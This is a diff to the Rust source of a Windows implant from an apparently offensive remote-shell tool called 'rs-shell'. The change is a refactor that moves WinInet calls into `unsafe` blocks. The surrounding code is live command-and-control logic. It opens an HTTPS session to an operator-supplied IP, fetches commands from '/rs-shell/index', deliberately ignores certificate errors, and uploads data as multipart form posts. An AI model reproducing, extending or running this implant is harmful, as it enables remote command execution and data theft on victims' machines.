@@ -26,44 +26,46 @@ use windows_sys::Win32::Networking::WinInet::{
 };
 use windows_sys::Win32::System::Console::GetConsoleWindow;
 
-unsafe fn init_session(ip: &str, url: &str) -> Result<(*mut c_void, *mut c_void), io::Error> {
+fn init_session(ip: &str, url: &str) -> Result<(*mut c_void, *mut c_void), io::Error> {
     // Standard user agent setup, can be changed to a custom one
     let user_agent_cstring = CString::new("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36").unwrap();
     let user_agent = user_agent_cstring.as_ptr() as *const u8;
 
-    // The flag 'INTERNET_OPEN_TYPE_PRECONFIG' permits to find proxy configurations in the registry
-    let h_internet = InternetOpenA(
-        user_agent,
-        INTERNET_OPEN_TYPE_PRECONFIG,
-        null_mut(),
-        null_mut(),
-        0,
-    );
-    if h_internet.is_null() {
-        return Err(io::Error::last_os_error());
+    unsafe {
+        // The flag 'INTERNET_OPEN_TYPE_PRECONFIG' permits to find proxy configurations in the registry
+        let h_internet = InternetOpenA(
+            user_agent,
+            INTERNET_OPEN_TYPE_PRECONFIG,
+            null_mut(),
+            null_mut(),
+            0,
+        );
+        if h_internet.is_null() {
+            return Err(io::Error::last_os_error());
+        }
+
+        let ip_cstring = CString::new(ip).unwrap();
+        let ip = ip_cstring.as_ptr() as *const u8;
+        let h_connect = InternetConnectA(
+            h_internet,
+            ip,
+            INTERNET_DEFAULT_HTTPS_PORT,
+            null_mut(),
+            null_mut(),
+            INTERNET_SERVICE_HTTP,
+            0,
+            0,
+        );
+        if h_connect.is_null() {
+            InternetCloseHandle(h_internet);
+            return Err(io::Error::last_os_error());
+        }
+
+        let http_verb = "GET";
+        make_request(h_connect, url, http_verb, null_mut(), 0, false)?;
+
+        Ok((h_internet, h_connect))
     }
-
-    let ip_cstring = CString::new(ip).unwrap();
-    let ip = ip_cstring.as_ptr() as *const u8;
-    let h_connect = InternetConnectA(
-        h_internet,
-        ip,
-        INTERNET_DEFAULT_HTTPS_PORT,
-        null_mut(),
-        null_mut(),
-        INTERNET_SERVICE_HTTP,
-        0,
-        0,
-    );
-    if h_connect.is_null() {
-        InternetCloseHandle(h_internet);
-        return Err(io::Error::last_os_error());
-    }
-
-    let http_verb = "GET";
-    make_request(h_connect, url, http_verb, null_mut(), 0, false)?;
-
-    Ok((h_internet, h_connect))
 }
 
 unsafe fn make_request(
@@ -79,98 +81,100 @@ unsafe fn make_request(
     let url_cstring = CString::new(url).unwrap();
     let url = url_cstring.as_ptr() as *const u8;
 
-    // The flag 'INTERNET_FLAG_KEEP_CONNECTION' permits to handle authentication
-    let h_request = HttpOpenRequestA(
-        h_connect,
-        http_verb,
-        url,
-        null_mut(),
-        null_mut(),
-        null_mut(),
-        INTERNET_FLAG_RELOAD
-            | INTERNET_FLAG_SECURE
-            | INTERNET_FLAG_KEEP_CONNECTION
-            | INTERNET_FLAG_NEED_FILE
-            | INTERNET_FLAG_NO_CACHE_WRITE,
-        0,
-    );
-    if h_request.is_null() {
-        return Err(io::Error::last_os_error());
-    }
-
-    // Flags to ignore certificate errors
-    let mut flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA
-        | SECURITY_FLAG_IGNORE_WRONG_USAGE
-        | INTERNET_FLAG_IGNORE_CERT_CN_INVALID
-        | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID;
-    InternetSetOptionA(
-        h_request,
-        (INTERNET_OPTION_SECURITY_FLAGS as i32).try_into().unwrap(),
-        &mut flags as *mut _ as *mut c_void,
-        std::mem::size_of_val(&flags) as u32,
-    );
-
-    loop {
-        if download {
-            let headers = CString::new("Content-Type: multipart/form-data; boundary=---------------------------345495480920487783503652546823").unwrap();
-            let success = HttpSendRequestA(
-                h_request,
-                headers.as_ptr() as *const u8,
-                -1isize as u32,
-                data,
-                data_len,
-            );
-            if success == 0 {
-                InternetCloseHandle(h_request);
-                return Err(io::Error::last_os_error());
-            }
-        } else {
-            let success = HttpSendRequestA(h_request, null_mut(), 0, data, data_len);
-            if success == 0 {
-                log::debug!("HttpSendRequestA error: {}", io::Error::last_os_error());
-                InternetCloseHandle(h_request);
-                return Err(io::Error::last_os_error());
-            }
+    unsafe {
+        // The flag 'INTERNET_FLAG_KEEP_CONNECTION' permits to handle authentication
+        let h_request = HttpOpenRequestA(
+            h_connect,
+            http_verb,
+            url,
+            null_mut(),
+            null_mut(),
+            null_mut(),
+            INTERNET_FLAG_RELOAD
+                | INTERNET_FLAG_SECURE
+                | INTERNET_FLAG_KEEP_CONNECTION
+                | INTERNET_FLAG_NEED_FILE
+                | INTERNET_FLAG_NO_CACHE_WRITE,
+            0,
+        );
+        if h_request.is_null() {
+            return Err(io::Error::last_os_error());
         }
 
-        // Check the errors and if the request requires authentication
-        let dw_error_code = GetLastError();
-        let hwnd = GetConsoleWindow();
-        let dw_error = InternetErrorDlg(
-            hwnd,
+        // Flags to ignore certificate errors
+        let mut flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA
+            | SECURITY_FLAG_IGNORE_WRONG_USAGE
+            | INTERNET_FLAG_IGNORE_CERT_CN_INVALID
+            | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID;
+        InternetSetOptionA(
             h_request,
-            dw_error_code,
-            FLAGS_ERROR_UI_FILTER_FOR_ERRORS
-                | FLAGS_ERROR_UI_FLAGS_CHANGE_OPTIONS
-                | FLAGS_ERROR_UI_FLAGS_GENERATE_DATA,
-            null_mut(),
+            (INTERNET_OPTION_SECURITY_FLAGS as i32).try_into().unwrap(),
+            &mut flags as *mut _ as *mut c_void,
+            std::mem::size_of_val(&flags) as u32,
         );
 
-        if dw_error == ERROR_INTERNET_FORCE_RETRY {
-            log::debug!("Force retry error: {}", io::Error::last_os_error());
-            continue;
-        } else {
-            break;
+        loop {
+            if download {
+                let headers = CString::new("Content-Type: multipart/form-data; boundary=---------------------------345495480920487783503652546823").unwrap();
+                let success = HttpSendRequestA(
+                    h_request,
+                    headers.as_ptr() as *const u8,
+                    -1isize as u32,
+                    data,
+                    data_len,
+                );
+                if success == 0 {
+                    InternetCloseHandle(h_request);
+                    return Err(io::Error::last_os_error());
+                }
+            } else {
+                let success = HttpSendRequestA(h_request, null_mut(), 0, data, data_len);
+                if success == 0 {
+                    log::debug!("HttpSendRequestA error: {}", io::Error::last_os_error());
+                    InternetCloseHandle(h_request);
+                    return Err(io::Error::last_os_error());
+                }
+            }
+
+            // Check the errors and if the request requires authentication
+            let dw_error_code = GetLastError();
+            let hwnd = GetConsoleWindow();
+            let dw_error = InternetErrorDlg(
+                hwnd,
+                h_request,
+                dw_error_code,
+                FLAGS_ERROR_UI_FILTER_FOR_ERRORS
+                    | FLAGS_ERROR_UI_FLAGS_CHANGE_OPTIONS
+                    | FLAGS_ERROR_UI_FLAGS_GENERATE_DATA,
+                null_mut(),
+            );
+
+            if dw_error == ERROR_INTERNET_FORCE_RETRY {
+                log::debug!("Force retry error: {}", io::Error::last_os_error());
+                continue;
+            } else {
+                break;
+            }
         }
-    }
 
-    let mut buffer = [0; 1024];
-    let mut vec_output = Vec::new();
-    let mut read_size = 0;
-    while InternetReadFile(
-        h_request,
-        buffer.as_mut_ptr() as *mut _,
-        buffer.len() as u32,
-        &mut read_size,
-    ) != 0
-        && read_size > 0
-    {
-        vec_output.extend_from_slice(&buffer[..read_size as usize]);
-        read_size = 0;
-    }
+        let mut buffer = [0; 1024];
+        let mut vec_output = Vec::new();
+        let mut read_size = 0;
+        while InternetReadFile(
+            h_request,
+            buffer.as_mut_ptr() as *mut _,
+            buffer.len() as u32,
+            &mut read_size,
+        ) != 0
+            && read_size > 0
+        {
+            vec_output.extend_from_slice(&buffer[..read_size as usize]);
+            read_size = 0;
+        }
 
-    InternetCloseHandle(h_request);
-    Ok(vec_output)
+        InternetCloseHandle(h_request);
+        Ok(vec_output)
+    }
 }
 
 fn do_stuff(cmd: &str) -> Vec<u8> {
@@ -193,7 +197,7 @@ pub fn implant(ip: &str) -> Result<(), Box<dyn Error>> {
     let password = "password";*/
 
     let index_url = "/rs-shell/index";
-    match unsafe { init_session(ip, index_url) } {
+    match init_session(ip, index_url) {
         Ok((h_internet, h_connect)) => {
             log::debug!("Session initialized");
 
